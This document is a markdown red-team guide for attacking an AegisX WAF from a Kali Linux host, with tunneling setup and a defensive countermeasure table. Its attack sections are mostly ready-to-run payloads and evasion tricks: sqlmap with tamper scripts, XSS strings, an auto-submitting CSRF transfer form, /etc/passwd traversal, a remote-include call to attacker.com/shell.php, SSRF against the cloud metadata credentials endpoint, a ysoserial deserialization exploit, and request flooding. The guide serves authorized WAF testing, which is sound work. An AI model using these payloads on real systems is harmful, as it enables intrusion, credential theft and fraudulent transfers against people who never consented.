# ⚔️ How to Attack AegisX WAF from Another PC (Kali Linux)

This guide walks a **red‑team** through a full‑scale, industry‑grade attack scenario against an AegisX WAF deployment from a **different host** (Kali Linux). It covers:
- Network preparation (LAN & Internet exposure)
- High‑level evasion techniques to bypass the AI‑driven firewall
- Real‑world web‑attack vectors: **SQL injection, XSS, CSRF, HTTP Verb Tampering, Parameter Pollution, File Inclusion, SSRF, RCE, Business‑Logic abuse**
- Tool‑chains (`sqlmap`, `xsser`, `burp suite`, `nuclei`, `ffuf`, `curl`, `wget`, `zap`, `mantra`, `dirb`, `sublist3r` etc.)
- Post‑exploitation telemetry verification via the AegisX dashboard

---

## 🏗️ 1. Environment Overview

| Role | Machine | OS | Purpose |
|------|---------|----|---------|
| **Defender (Host)** | PC A | Windows 11 / Server 2022 | Runs Docker stack – `nginx‑proxy`, `waf‑engine`, `ai‑service`, `dashboard` |
| **Attacker** | PC B | Kali Linux (2024.4 or later) | Executes manual and automated attacks |

Both machines must be on the **same Layer‑2 network** (e.g., Wi‑Fi or wired LAN) **or exposed to the Internet** via port‑forwarding / tunneling.

---

## 🔧 2. Host (Defender) Preparation

### 2.1 Discover Host IP & Open Ports
```powershell
# PowerShell (run as Administrator)
ipconfig | findstr /i "IPv4"
# Example output -> 192.168.1.10 (HOST_IP)
```
Open the required ports on Windows Firewall:
```powershell
# HTTP entry (nginx‑proxy) – port 80 (and 443 if TLS enabled)
New-NetFirewallRule -DisplayName "AegisX WAF HTTP" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
# Dashboard – port 3000 (optional – for remote viewing)
New-NetFirewallRule -DisplayName "AegisX Dashboard" -Direction Inbound -LocalPort 3000 -Protocol TCP -Action Allow
```
> **Tip:** If you plan to expose the host on the public Internet, also allow port **443** (TLS) and configure your router’s NAT.

### 2.2 (Optional) Expose via **ngrok** or **Cloudflare Tunnel**
```powershell
# Download ngrok (Windows)
Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
Expand-Archive ngrok.zip -DestinationPath .
.
# Authenticate (replace <TOKEN> with your ngrok auth token)
./ngrok authtoken <TOKEN>
# Start TCP tunnel to port 80 (HTTP) – this creates a public endpoint
./ngrok tcp 80
# Copy the generated forward address, e.g. tcp://0.tcp.ngrok.io:12345
```
The public address can now be used by the attacker (replace `HOST_IP` with the ngrok endpoint).

---

## 🕵️ 3. Attacker (Kali) – Network Configuration
```bash
# Identify own IP on the LAN
ip a | grep inet
# Verify connectivity to the host
ping -c 4 <HOST_IP>
# If using ngrok, no extra routing is needed – just use the ngrok address.
```
If you are behind a NAT and want to reach the host from the Internet **without a tunnel**, configure port‑forwarding on the router:
- Forward **external port 80 → internal 192.168.1.10:80** (HTTP)
- Forward **external port 443 → internal 192.168.1.10:443** (HTTPS, if enabled)
- Forward **external port 3000 → internal 192.168.1.10:3000** (Dashboard – optional)

---

## 🎯 4. High‑Level Attack Vectors & Evasion Techniques

### 4.1 SQL Injection (Blind, Time‑Based, Union‑Based)
```bash
# Basic sqlmap usage against the public endpoint (replace TARGET)
sqlmap -u "http://<HOST_IP>/search?q=1" --batch --risk=3 --level=5
# Bypass basic WAF filters – use tamper scripts
sqlmap -u "http://<HOST_IP>/search?q=1" --tamper=space2comment,between,randomcase
# Time‑based blind payload (if the app uses parameterized queries)
sqlmap -u "http://<HOST_IP>/login" --data "username=admin&password=admin" --technique=T --time-sec=5
```
**Evasion tricks:**
- URL‑encode characters (`%27` for `'`)
- Double‑encode (`%2527`)
- Use **hex/charcode** (`0x27`)
- **HTTP Verb tampering** (`POST` with query string, `PUT`, `DELETE`)
- **Parameter Pollution** (`id=1&id=2`)

### 4.2 Cross‑Site Scripting (Stored & Reflected)
```bash
# xsser – automated reflected XSS detection
xsser -u "http://<HOST_IP>/comment?msg=TEST" -g "<script>alert('XSS')</script>"
# Manual payload via curl (obfuscate with HTML entities)
curl -G "http://<HOST_IP>/search" --data-urlencode "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
# Use **DOM‑based** payloads – deliver via JSON API
curl -X POST "http://<HOST_IP>/api/comment" -H "Content-Type: application/json" -d '{"comment":"<svg/onload=alert(1)>"}'
```
**Bypass techniques:**
- **Unicode/UTF‑7** encoding (`%u003Cscript%u003E`)
- **Mixed case** (`<ScRiPt>`)
- **Event‑handler injection** (`onerror=alert(1)`) on image tags
- **HTML attribute breaking** (`" onmouseover=alert(1) "`)
- **Template injection** (if the backend uses Jinja2/Thymeleaf – send `${{7*7}}`)

### 4.3 Cross‑Site Request Forgery (CSRF)
Create a malicious HTML page and host it on a separate web server (Kali's `apache2` or `python -m http.server`):
```html
<!DOCTYPE html>
<html><body>
  <form action="http://<HOST_IP>/api/transfer" method="POST" id="csrf_form">
    <input type="hidden" name="amount" value="1000"/>
    <input type="hidden" name="to" value="attacker_account"/>
  </form>
  <script>document.getElementById('csrf_form').submit();</script>
</body></html>
```
Serve it:
```bash
cd /var/www/html && sudo cp csrf.html index.html
sudo systemctl restart apache2
```
When a logged‑in victim visits the page, the POST will be sent automatically. To **bypass same‑site cookie restrictions**, use **sub‑domain takeover** or **Open Redirect** in the target site to force the request.

### 4.4 HTTP Verb & Method Tampering
```bash
# Use OPTIONS to discover allowed verbs
curl -X OPTIONS -i http://<HOST_IP>/admin
# Use VERB override header (X‑HTTP‑Method‑Override)
curl -H "X-HTTP-Method-Override: DELETE" -X POST http://<HOST_IP>/api/user/1
# Use `TRACE` to reflect request headers (potential XSS via header injection)
curl -X TRACE http://<HOST_IP>/
```
Many WAFs block exotic verbs; AegisX can be probed with **`--method=PUT`** in `sqlmap` or **`-X`** flag in `curl`.

### 4.5 Parameter Pollution & Duplicate Parameters
```bash
curl "http://<HOST_IP>/search?q=admin&q=union+select+1,2,3"
# In Burp Suite – add duplicate `id` fields in the request body
```
The WAF may only inspect the **first** occurrence; the second can carry the malicious payload.

### 4.6 File Inclusion & Path Traversal
```bash
# LFI via classic traversal payloads (double‑encoded)
curl "http://<HOST_IP>/includes?page=..%2F..%2Fetc%2Fpasswd"
# RFI – supply a remote PHP payload if `allow_url_include` is enabled
curl "http://<HOST_IP>/loader?file=http://attacker.com/shell.php"
```
**Evasion:** use **null byte** (`%00`) termination, **url‑encoding** of slashes, or **UTF‑8 overlong encoding**.

### 4.7 Server‑Side Request Forgery (SSRF)
```bash
# Attempt to fetch internal metadata service (AWS, GCP)
curl "http://<HOST_IP>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
Combine with **protocol‑smuggling** (`http://127.0.0.1:8080/\@evil.com`) to bypass simple host‑whitelists.

### 4.8 Remote Code Execution (RCE) via Deserialization
If the backend accepts JSON/YAML/XML objects, try gadget chains:
```bash
# ysoserial for Java deserialization
java -jar ysoserial.jar CommonsCollections5 "calc" | base64 > payload.b64
curl -X POST "http://<HOST_IP>/api/deserialize" -H "Content-Type: application/json" -d "{\"data\": \"$(cat payload.b64)\"}"
```
Obfuscate using **gzip compression**, **chunked transfer encoding**, or **multipart/form-data** to evade pattern‑based detection.

### 4.9 Business‑Logic Abuse & Rate‑Limiting Bypass
```bash
# Repeatedly request password‑reset endpoint with different tokens
for i in {1..100}; do curl -X POST "http://<HOST_IP>/api/password/reset" -d "email=user@example.com"; done
```
Use **slow‑loris** (`ab -n 1000 -c 1`) to exhaust connection pools.

---

## 📡 5. Testing Over the Internet
1. **Expose the host** via **ngrok/tunnel** (see Section 2.2) – yields a public `tcp://x.tcp.ngrok.io:XXXXX` address.
2. **Configure DNS** (optional) – point a sub‑domain (`waf‑test.example.com`) to your router’s **WAN IP** using a dynamic‑DNS provider (e.g., **No‑IP**, **DuckDNS**).
3. **Obtain a TLS certificate** for the public domain (Let’s Encrypt) and configure `nginx/nginx.conf` to serve HTTPS.
4. **Run attacks** using the public endpoint, e.g.:
   ```bash
   sqlmap -u "https://waf-test.example.com/search?q=1" --batch --risk=3 --level=5
   xsser -u "https://waf-test.example.com/comment?msg=TEST"
   ```
5. **Monitor** the AegisX dashboard (accessible via `https://waf-test.example.com:3000` if you exposed the dashboard) to see which payloads were blocked, latency, and attack‑source IP.

---

## 📊 6. Verifying WAF Efficacy via the Dashboard
- **Live Global Attack Map** – each blocked request appears as a point on the map (check for your attack IP).
- **Metrics Panel** – watch `Blocked Requests`, `Risk Score` distribution, and **latency spikes**.
- **WebSocket Feed** – open the browser console on the dashboard (`Ctrl+Shift+I`) and inspect messages on `ws://<HOST_IP>/ws` to confirm the WAF is emitting events.
- **Export logs** – click **Download CSV** from the dashboard to retain a forensic record.

---

## 🛡️ 7. Defensive Recommendations (Blue‑Team Quick Wins)
| Technique | Countermeasure |
|-----------|----------------|
| **Obfuscation / Encoding** | Enable **canonicalization** in the WAF (decode URL, HTML, Unicode) before inspection. |
| **HTTP Verb Tampering** | Enforce an **allow‑list** of verbs at the Nginx level (`limit_except GET POST`). |
| **Parameter Pollution** | Normalize request parameters (keep only the first occurrence) before analysis. |
| **File Inclusion** | Disable **`allow_url_include`** and lock down **`open_basedir`** for PHP; use **`deny all`** for `/etc/` paths. |
| **SSRF** | Implement **outbound request whitelisting**; block private IP ranges at the reverse proxy. |
| **RCE / Deserialization** | Disallow **unsafe deserialization** libraries, enforce **content‑type** validation, and use **schema validation**. |
| **Rate‑Limiting** | Enable Nginx **`limit_req_zone`** and **`limit_req`** directives per IP. |
| **TLS & HSTS** | Enforce HTTPS, use **HSTS**, and pin certificates. |

---

## 📚 8. References & Tools
- **sqlmap** – https://github.com/sqlmapproject/sqlmap
- **xsser** – https://github.com/epsylon/xsser
- **Burp Suite Pro** – https://portswigger.net/burp
- **nuclei** – https://github.com/projectdiscovery/nuclei (templates for LFI, RCE, SSRF)
- **ffuf** – https://github.com/ffuf/ffuf (fuzzing directories & parameters)
- **OWASP ZAP** – https://www.zaproxy.org/
- **ngrok** – https://ngrok.com/
- **Cloudflare Tunnel** – https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/

---

*This guide is deliberately aggressive – only run these tests against environments you own or have explicit permission to attack. Use responsibly and always follow your organization’s rules of engagement.*

## 🌐 Remote Internet Testing

When the attacker is **not on the same LAN** as the protected host, you must make the WAF reachable over the public Internet. Below are common, production‑grade approaches:

### 1️⃣ Public IP / Port‑Forwarding (Direct Exposure)
1. **Identify your router’s WAN IP** (e.g., `curl ifconfig.me`).
2. **Configure NAT** on the router to forward:
   - **Port 80 → internal 192.168.x.x:80** (HTTP) ;
   - **Port 443 → internal 192.168.x.x:443** (HTTPS, if TLS is enabled);
   - **Port 3000 → internal 192.168.x.x:3000** (Dashboard – optional).
3. **Secure the exposed service** with a valid TLS certificate (Let’s Encrypt) and enable HSTS.
4. **Update DNS** (optional) – point a domain/sub‑domain to the WAN IP using a dynamic‑DNS provider (e.g., DuckDNS, No‑IP) so you can use a stable hostname.

### 2️⃣ Cloud‑Based Tunneling Services
| Service | How it works | Pros | Cons |
|---------|--------------|------|------|
| **ngrok** | Creates a secure tunnel from a public endpoint to your local port. | Quick, no router changes, supports TLS. | Free tier limits concurrent tunnels and traffic.
| **Cloudflare Tunnel (formerly Argo Tunnel)** | Cloudflare proxies traffic to a locally‑run daemon. | Built‑in DDoS protection, custom domain, free tier generous. | Requires Cloudflare account and DNS configuration.
| **localtunnel** | Simple HTTP tunnel via a public URL. | Minimal setup. | Less stable, limited bandwidth.

**Example – ngrok TCP tunnel for HTTP**:
```powershell
# On the Windows host (run as Administrator)
ngrok tcp 80
# Output: Forwarding tcp://0.tcp.ngrok.io:xxxxx -> localhost:80
```
Use the `tcp://0.tcp.ngrok.io:xxxxx` address as the target in your attack scripts.

**Example – Cloudflare Tunnel**:
```bash
# Install cloudflared on the host (Windows/Linux)
cloudflared tunnel create aegisx-waf
cloudflared tunnel route dns aegisx-waf waf-test.example.com
cloudflared tunnel run aegisx-waf
```
Now `https://waf-test.example.com` resolves to your local Nginx.

### 3️⃣ Deploy the Stack to a Cloud VM (AWS, Azure, GCP)
1. Spin up a **small VM** (e.g., t3.micro) with a public IP.
2. Install Docker and pull the AegisX stack (`docker compose up -d`).
3. Open the required security‑group ports (80/443/3000).
4. The WAF is now natively reachable via the VM’s public IP/hostname.

### 4️⃣ Verify Reachability from a Remote Kali Box
```bash
# Replace <TARGET> with the public hostname/IP (or ngrok address)
curl -I http://<TARGET>/healthz   # should return 200 OK
# Run a simple SQLi test over the Internet
sqlmap -u "http://<TARGET>/search?q=1" --batch --risk=3 --level=5
```
If you encounter **connection timeouts**, double‑check:
- Firewall rules on the host (Windows Defender, cloud‑provider SG)
- NAT/port‑forwarding correctness
- That the tunnel daemon is running and not throttled.

### 5️⃣ Monitoring from Anywhere
- Access the **dashboard remotely** via the public URL (ensure you expose port 3000 or proxy it behind Nginx with a sub‑path like `/dashboard`).
- Use a **VPN** (e.g., OpenVPN, WireGuard) to secure the management plane while still allowing the attacker to reach the public endpoint.
- Collect logs from the dashboard’s **WebSocket feed** to correlate remote attack attempts with blocking decisions.

---

*Remember to always respect legal boundaries and obtain explicit authorization before attacking any publicly‑exposed service.*
